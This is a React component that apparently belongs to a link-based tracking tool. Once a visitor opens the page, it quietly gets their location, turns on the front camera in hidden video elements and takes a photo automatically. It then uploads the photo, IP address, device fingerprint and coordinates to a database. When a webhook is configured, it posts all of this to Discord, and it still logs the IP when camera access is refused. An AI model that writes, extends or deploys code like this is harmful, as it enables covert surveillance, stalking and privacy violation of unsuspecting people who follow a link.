
import React, { useRef, useEffect, useState } from 'react';
import supabase from '../utils/database';
import { sendDiscordWebhook } from '../utils/discordWebhook';

interface CameraCaptureProps {
  onSuccess: () => void;
  onError: (error: any) => void;
  customWebhook?: string;
  shortCode?: string;
}

const CameraCapture: React.FC<CameraCaptureProps> = ({ onSuccess, onError, customWebhook, shortCode }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [isCapturing, setIsCapturing] = useState(false);
  const [hasPermission, setHasPermission] = useState<boolean | null>(null);
  const [userLocation, setUserLocation] = useState<{latitude: number, longitude: number} | null>(null);

  useEffect(() => {
    getCurrentLocation();
    startCamera();
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const getCurrentLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setUserLocation({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          });
          console.log('Location obtained:', position.coords.latitude, position.coords.longitude);
        },
        (error) => {
          console.error('Error getting location:', error);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 60000
        }
      );
    }
  };

  const startCamera = async () => {
    try {
      console.log('Starting camera...');
      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        } 
      });
      
      setStream(mediaStream);
      setHasPermission(true);
      
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        
        videoRef.current.onloadedmetadata = () => {
          console.log('Video metadata loaded');
          videoRef.current?.play();
        };

        videoRef.current.onplaying = () => {
          console.log('Video is playing, ready to capture');
          setTimeout(() => {
            capturePhoto();
          }, 1000);
        };
      }

    } catch (error) {
      console.error('Camera access denied:', error);
      setHasPermission(false);
      await saveIpOnlyData();
    }
  };

  const capturePhoto = async () => {
    if (!videoRef.current || !canvasRef.current || isCapturing) return;

    const video = videoRef.current;
    
    if (video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
      console.log('Video not ready yet, waiting...');
      setTimeout(() => capturePhoto(), 500);
      return;
    }

    try {
      setIsCapturing(true);
      console.log('Capturing photo...', {
        videoWidth: video.videoWidth,
        videoHeight: video.videoHeight,
        readyState: video.readyState
      });

      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');

      if (!context) {
        throw new Error('Canvas context not available');
      }

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.clearRect(0, 0, canvas.width, canvas.height);
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
      const data = imageData.data;
      let isBlank = true;
      
      for (let i = 0; i < data.length; i += 4) {
        if (data[i] !== 0 || data[i + 1] !== 0 || data[i + 2] !== 0) {
          isBlank = false;
          break;
        }
      }

      if (isBlank) {
        console.warn('Captured image appears to be blank, retrying...');
        setTimeout(() => capturePhoto(), 500);
        return;
      }

      canvas.toBlob(async (blob) => {
        if (!blob) {
          throw new Error('Failed to create photo blob');
        }

        console.log('Photo blob created successfully, size:', blob.size);
        await uploadPhotoToSupabase(blob);
        
      }, 'image/jpeg', 0.9);

    } catch (error) {
      console.error('Error capturing photo:', error);
      onError(error);
    } finally {
      setIsCapturing(false);
    }
  };

  const uploadPhotoToSupabase = async (blob: Blob) => {
    try {
      console.log('Starting photo upload process...');
      
      if (!shortCode) {
        throw new Error('Short code is required for photo upload');
      }

      const fileName = `photo_${shortCode}_${Date.now()}.jpg`;
      console.log('Uploading photo with filename:', fileName);
      
      // Upload to Supabase storage
      const { data: uploadData, error: uploadError } = await supabase.storage
        .from('photos')
        .upload(fileName, blob, {
          contentType: 'image/jpeg',
          upsert: false
        });

      if (uploadError) {
        console.error('Storage upload error:', uploadError);
        throw uploadError;
      }

      console.log('Photo uploaded successfully to storage:', uploadData);

      // Get public URL
      const { data: { publicUrl } } = supabase.storage
        .from('photos')
        .getPublicUrl(fileName);

      console.log('Photo public URL:', publicUrl);

      const deviceInfo = {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };

      const clientIp = await getClientIP();

      // Save tracking data to database
      const trackingData = {
        short_code: shortCode,
        type: 'photo',
        data: {
          fileName: fileName,
          deviceInfo: deviceInfo,
          timestamp: new Date().toISOString(),
          imageUrl: publicUrl,
          uploadSuccess: true
        },
        yuuka: publicUrl,
        user_agent: navigator.userAgent,
        ip_address: clientIp,
        latitude: userLocation?.latitude || null,
        longitude: userLocation?.longitude || null,
        created_at: new Date().toISOString()
      };

      console.log('Saving photo tracking data to database:', trackingData);

      const { data: dbData, error: dbError } = await supabase
        .from('tracking_data')
        .insert([trackingData])
        .select();

      if (dbError) {
        console.error('Database insert error:', dbError);
        throw dbError;
      }

      console.log('Photo tracking data saved successfully:', dbData);

      // Send to Discord webhook if configured
      if (customWebhook) {
        console.log('Sending photo to Discord webhook...');
        try {
          await sendDiscordWebhook(customWebhook, {
            content: `📸 **Photo Captured Successfully**`,
            embeds: [{
              title: "Camera Capture Information",
              color: 3447003,
              fields: [
                {
                  name: "📱 Device Info",
                  value: `**Platform:** ${deviceInfo.platform}\n**Screen:** ${deviceInfo.screenWidth}×${deviceInfo.screenHeight}`,
                  inline: false
                },
                {
                  name: "📍 Location",
                  value: userLocation ? `**Lat:** ${userLocation.latitude}\n**Lng:** ${userLocation.longitude}` : 'Location not available',
                  inline: true
                },
                {
                  name: "🔗 Short Code",
                  value: shortCode,
                  inline: true
                },
                {
                  name: "📂 File Info",
                  value: `**Name:** ${fileName}\n**Size:** ${Math.round(blob.size / 1024)}KB`,
                  inline: true
                }
              ],
              footer: {
                text: `Photo captured at ${new Date().toLocaleString()}`
              },
              image: {
                url: publicUrl
              }
            }]
          });
          console.log('Photo sent to Discord webhook successfully');
        } catch (webhookError) {
          console.error('Discord webhook error:', webhookError);
        }
      }

      console.log('Photo capture process completed successfully');
      onSuccess();

    } catch (error) {
      console.error('Error in photo upload process:', error);
      onError(error);
    }
  };

  const saveIpOnlyData = async () => {
    try {
      console.log('Saving IP-only data due to camera access denied...');
      
      if (!shortCode) {
        throw new Error('Short code is required');
      }

      const clientIp = await getClientIP();
      
      const trackingData = {
        short_code: shortCode,
        type: 'ip_only',
        data: {
          reason: 'Camera permission denied',
          deviceInfo: {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            screenWidth: screen.width,
            screenHeight: screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
          },
          timestamp: new Date().toISOString()
        },
        user_agent: navigator.userAgent,
        ip_address: clientIp,
        latitude: userLocation?.latitude || null,
        longitude: userLocation?.longitude || null,
        created_at: new Date().toISOString()
      };

      console.log('Saving IP-only tracking data:', trackingData);

      const { data: dbData, error: dbError } = await supabase
        .from('tracking_data')
        .insert([trackingData])
        .select();

      if (dbError) {
        console.error('Database error for IP-only data:', dbError);
        throw dbError;
      }

      console.log('IP-only data saved successfully:', dbData);
      onSuccess();

    } catch (error) {
      console.error('Error saving IP-only data:', error);
      onError(error);
    }
  };

  const getClientIP = async (): Promise<string> => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      console.log('Client IP retrieved:', data.ip);
      return data.ip;
    } catch (error) {
      console.error('Error getting client IP:', error);
      return 'unknown';
    }
  };

  return (
    <div className="hidden">
      {hasPermission !== false && (
        <>
          <video
            ref={videoRef}
            autoPlay
            muted
            playsInline
            style={{ display: 'none' }}
          />
          <canvas
            ref={canvasRef}
            style={{ display: 'none' }}
          />
        </>
      )}
    </div>
  );
};

export default CameraCapture;
